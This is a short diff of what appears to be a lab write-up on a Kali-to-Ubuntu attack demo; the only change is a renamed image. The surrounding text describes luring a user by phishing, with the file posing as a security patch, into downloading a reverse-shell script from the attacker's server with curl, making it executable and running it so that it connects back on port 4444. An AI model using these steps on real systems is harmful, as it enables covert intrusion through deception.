@@ -58,7 +58,7 @@ At this point, the only thing left to do is to listen on the default port, to do
 To create the reverse shell, it is necessary for the user on the attacked machine to be convinced to download and execute the `reverseshell.sh` file, this could be done by creating a phishing email and convincing him, for example, that it is a security patch. In the demo, the command `curl -O "http://10.0.2.2/demo/reverseshell.sh"` is used, which downloads the file from the web file server created on Kali, at this point the command `sudo chmod +x reverseshell.sh` is executed which adds the execution permission to the file with administrator privileges, finally the file is executed with `./reverseshell.sh`.
 At this point, being the reverse shell executed in the background, the user on Ubuntu can continue to use the terminal normally, without noticing anything, but in reality he is connected on port 4444 to the Kali machine through a reverse shell.
 
-![Reverse Shell](images/rel.png)
+![Reverse Shell](images/reverseshell.png)
 
 # DoS and persistence
 
